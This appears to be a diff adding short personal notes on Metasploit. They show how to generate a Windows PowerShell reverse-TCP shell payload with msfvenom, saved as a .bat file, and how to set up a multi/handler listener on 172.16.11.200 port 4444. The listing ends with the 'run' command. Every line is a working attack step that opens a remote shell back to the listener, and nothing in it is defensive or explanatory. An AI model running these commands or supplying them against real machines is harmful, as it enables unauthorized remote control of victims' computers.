@@ -1,0 +1,17 @@
+
+# create payload
+msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=172.16.11.200 LPORT=4444 > payload_powershell.bat
+
+# lounch
+ msfconsole
+
+# run payload
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload cmd/windows/powershell_reverse_tcp
+payload => cmd/windows/powershell_reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > set LHOST 172.16.11.200
+LHOST => 172.16.11.200
+msf6 exploit(multi/handler) > run
